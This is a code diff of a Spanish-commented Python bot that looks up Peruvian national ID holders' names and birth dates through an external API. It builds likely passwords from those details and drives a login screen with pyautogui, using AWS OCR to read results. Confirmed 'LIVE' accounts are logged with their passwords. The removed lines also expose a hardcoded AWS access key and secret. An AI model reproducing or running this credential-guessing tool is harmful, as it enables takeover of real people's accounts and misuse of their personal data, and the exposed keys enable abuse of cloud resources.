@@ -1,154 +1,13 @@
 import pyautogui as p
 import time
 import requests
-#import PosiblesPass
-#import ObtenerDataReniec
+import PosiblesPass
+import ObtenerDataReniec
 from printy import printy
 import threading
 import json
-import boto3
+import reconocerTexto
 
-printy("Presione 'Enter' para continuar","n")
-input()
-
-class ReconocerTexto:
-    
-    def detect_text_from_image(image):
-        #documentName = "captcha.jpg"
-        documentName = image
-        with open(documentName, 'rb') as document:
-            imageBytes = bytearray(document.read())
-
-        region = 'us-east-1' 
-        aws_access_key_id = 'AKIAY4UO3BBQSW6YEBI3'
-        aws_secret_access_key = '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'
-
-        textract = boto3.client('textract', region_name=region, aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key)
-
-        response = textract.detect_document_text(Document={'Bytes': imageBytes})
-
-        # Lista para almacenar el texto detectado
-        detected_text = []
-
-        for item in response["Blocks"]:
-            if item["BlockType"] == "LINE":
-                detected_text.append(item["Text"])
-
-        # Unir las líneas de texto en un solo string usando join
-        unified_text = ' '.join(detected_text)
-
-        return unified_text
-
-class PosiblesPass:
-    def verificar_y_aumentar_longitud(valor):
-        valores = [0, 1, 2, 3, 4, 5, 6]
-        i = 0 
-        while len(valor) < 8:
-            valor = valor + str(valores[i])
-            i = i + 1
-        return valor
-
-    def procesar_cadena(cadena):
-        palabras = cadena.split("|")  # Usamos "|" como separador
-        # Extraer los datos
-        numero = palabras[0]
-        nombres = palabras[1].split()  # Dividir nombres por espacios en blanco
-        primer_nombre = nombres[0].lower().capitalize().strip()
-        
-        apellido_paterno = palabras[2].lower().capitalize().strip()
-        apellido_paterno =apellido_paterno.split()
-        apellido_paterno = apellido_paterno[0]
-        
-        # Verificar si hay un segundo nombre
-        if len(nombres) > 1:
-            segundo_nombre = nombres[1].lower().capitalize().strip()
-        else:
-            
-            if len(apellido_paterno) > 1:
-                segundo_nombre = apellido_paterno
-            else:
-                segundo_nombre = 'Peru'
-
-        try:
-            fecha_nacimiento = palabras[4].split("/")[2].strip()  # Extraer el año de nacimiento
-            fecha_nacimiento_dos_digitos = fecha_nacimiento[-2:]
-            dia_nacimiento = palabras[4].split("/")[0].strip()
-        except:
-            fecha_nacimiento = '1990'
-            fecha_nacimiento_dos_digitos = '10'
-            dia_nacimiento = '10'
-
-        valor1 = primer_nombre + fecha_nacimiento
-        valor2 = primer_nombre + dia_nacimiento
-        valor3 = primer_nombre + fecha_nacimiento_dos_digitos
-        valor4 =  segundo_nombre + fecha_nacimiento
-
-        # Verificar y ajustar la longitud de valor1, valor2, valor3 y valor4 a 8 caracteres
-        valor1 = PosiblesPass.verificar_y_aumentar_longitud(valor1)
-        valor2 = PosiblesPass.verificar_y_aumentar_longitud(valor2)
-        valor3 = PosiblesPass.verificar_y_aumentar_longitud(valor3)
-        valor4 = PosiblesPass.verificar_y_aumentar_longitud(valor4)
-        
-        # Devolver una lista con los valores
-        #return [numero, valor1, valor4]
-        return [numero, valor1, valor2, valor3, valor4]
-
-        #Ejemplo de uso:
-        cadena_entrada = '07570076|ANDRES|MACCHIAVELLO|VASQUEZ|None'
-        resultado = procesar_cadena(cadena_entrada)
-        print(resultado)  # Esto imprimirá: ['07542837', 'Gledis1953', 'Gledis1234', 'Reategui1953', 'Montes1953']
-
-
-class ObtenerDataReniec:
-    # Función para obtener los datos de un DNI y devolver la cadena formateada
-    def obtener_datos_dni(dni):
-        dni = dni.rstrip()
-        if len(dni) == 8:
-            api_url = 'https://jackelinos.azurewebsites.net/get_user_data'
-            # Crea el cuerpo JSON de la solicitud POST
-            payload = {'dni': dni}
-
-            # Realiza la solicitud POST a la API
-            response = requests.post(api_url, json=payload)
-
-            try:
-                # Verifica si la solicitud fue exitosa (código de estado 200)
-                if response.status_code == 200:
-                    # Verifica si la respuesta contiene datos
-                    user_data_list = response.json()
-                    if user_data_list:
-                        user_data = user_data_list[0]  # Obtiene la información del usuario
-
-                        # Extrae los campos necesarios
-                        DNI = user_data.get('DNI', '')
-                        NOMBRES = user_data.get('NOMBRES', '')
-                        AP_PAT = user_data.get('AP_PAT', '')
-                        AP_MAT = user_data.get('AP_MAT', '')
-                        FECHA_NAC = user_data.get('FECHA_NAC', '')
-
-                        # Reemplaza ├æ por "N" en los campos de texto
-                        NOMBRES = NOMBRES.replace('├æ', 'N')
-                        AP_PAT = AP_PAT.replace('├æ', 'N')
-                        AP_MAT = AP_MAT.replace('├æ', 'N')
-
-                        # Verifica si los campos están vacíos y los rellena con "None"
-                        if not NOMBRES:
-                            NOMBRES = "None"
-                        if not AP_PAT:
-                            AP_PAT = "None"
-                        if not AP_MAT:
-                            AP_MAT = "None"
-
-                        # Formatea la cadena y la devuelve
-                        return f'{DNI}|{NOMBRES}|{AP_MAT}|{AP_PAT}|{FECHA_NAC}'
-                    else:
-                        return f'ERROR'
-                else:
-                    return f'ERROR'
-            except:
-                return 'ERROR'
-        else:
-            return f'ERROR'
 
 DEATH_1 = "./imagenes/death_1.png"
 DEATH_2 = "./imagenes/death_2.png"
@@ -216,7 +75,7 @@ def obtener_Dni_chambeador(proceso):
             print("Error en la solicitud a la API.")
             return None
     except Exception as e:
-        print("Error durante la solicitud a la API:", str(e))
+        return f'Error en la pagina web'
         return None
 
 def obtener_Fila_Cantidad(proceso):
@@ -244,14 +103,14 @@ def obtener_Fila_Cantidad(proceso):
         #print("Response Content:", resultado.content)
 
     except Exception as e:
-        print("Error durante la solicitud a la API:", str(e))
+        return f'Error en la pagina web'
         return None
 
 
 
 def agregarStatusDB(dni, status):
-    api_url = f'https://jackelinos.azurewebsites.net/marcar_estado/'
     try:
+        api_url = f'https://jackelinos.azurewebsites.net/marcar_estado/'
         # Construir la URL con los parámetros de consulta
         url = f"{api_url}?dni={dni}&status={status}"
         
@@ -261,17 +120,23 @@ def agregarStatusDB(dni, status):
         
         return resultado_texto
     except Exception as e:
-        return f'Error: {str(e)}'
+        return f'Error en la pagina web'
 #  - - - - - - - - - - - - - - - - - - - APIS - - - - - - - - - - - - - - - - - - - - - 
 def marcar_procesado(dni):
-    api_url = f'https://jackelinos.azurewebsites.net/marcar_procesado/{dni}'
-    resultado = requests.put(api_url)
+    try:
+        api_url = f'https://jackelinos.azurewebsites.net/marcar_procesado/{dni}'
+        resultado = requests.put(api_url)
+    except Exception as e:
+        return f'Error en la pagina web'
     #print(resultado.status_code)  # Imprime el código de estado de la respuesta
     #print(resultado.text)  # Imprime el contenido de la respuesta
 
 def marcar_NO_procesado(dni):
-    api_url = f'https://jackelinos.azurewebsites.net/marcar_no_procesado/{dni}'
-    resultado = requests.put(api_url)
+    try:
+        api_url = f'https://jackelinos.azurewebsites.net/marcar_no_procesado/{dni}'
+        resultado = requests.put(api_url)
+    except Exception as e:
+        return f'Error en la pagina web' 
     #print(resultado.status_code)  # Imprime el código de estado de la respuesta
     #print(resultado.text)  # Imprime el contenido de la respuesta
 
@@ -282,10 +147,8 @@ def procesar_lote(proceso):
     while True:
         #print( '\n / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /')
         print( '\n------------------------------------------------------------------------------')
-        try:
-            dni = obtener_Dni_chambeador(proceso) # ELEGIR DE LA TABLA
-        except:
-            print("Problemas al obtener el DNI")
+
+        dni = obtener_Dni_chambeador(proceso) # ELEGIR DE LA TABLA
         
         #print(f'dni es este {dni}')
         #input('detenido')
@@ -348,9 +211,6 @@ def procesar_lote(proceso):
                     print(f' - {line} > > >') # 07542837|GLEDIS|REATEGUI|MONTES|30/04/1953
                     if line == 'ERROR':
                         print('ERROR AL OBTENER DATOS DEL DNI > > > omitiendo...')
-                        
-     
-                        
                         time.sleep(0.2)
                         p.press('esc') # para salir al menu principal
                         time.sleep(0.3)
@@ -446,7 +306,7 @@ def procesar_lote(proceso):
                             
                             p.screenshot("img_Num.png",region=(691,536,372,58))
                             image = "img_Num.png"
-                            txt_Numero = ReconocerTexto.detect_text_from_image(image)
+                            txt_Numero = reconocerTexto.detect_text_from_image(image)
                             
                             time.sleep(0.2)
                             p.click(714,105) # Click para retroceder
@@ -456,8 +316,8 @@ def procesar_lote(proceso):
                             
                             printy(f" LIVE -> {elDNI} pass: {data[PosicionContrasena]} -> {txt_Numero}")
                             
-                            text = f" LIVE -> {elDNI} pass: {data[PosicionContrasena]} -> {txt_Numero}".rstrip()
-                            lives = open("./data/lives.txt","a")
+                            text = f" LIVE Escolta -> {elDNI} pass: {data[PosicionContrasena]} -> {txt_Numero}".rstrip()
+                            lives = open("lives.txt","a")
                             lives.write(text) # escribir en el block
                             lives.write("\n")
                             lives.close()
@@ -504,19 +364,21 @@ def procesar_lote(proceso):
 
 
         except Exception as e:
-            mensaje_error = str(e)
-            print(f"Ocurrió un error: {mensaje_error}")
+
+            print(f"Ocurrió un error")
 
             api_url = f'https://jackelinos.azurewebsites.net/marcar_no_procesado/{elDNI}'
             resultado = requests.put(api_url)
-            print(resultado.text)  # Imprime el contenido de la respuesta
-
 
 
 if __name__ == "__main__":
 
+    #opcion_elegida = int(input("\nElige una Trabajador: "))
+
+    #Para los escoltas cambiar esto:
+    #           procesar_lote(10)     # depende que numero y hacerlo .exe
 
     try:
-        procesar_lote(19)
+        procesar_lote(100)
     except Exception as e:
-        print(f"ERROR.")
+        print(f"Ocurrió un error al procesar el lote, comuniquese con central.")
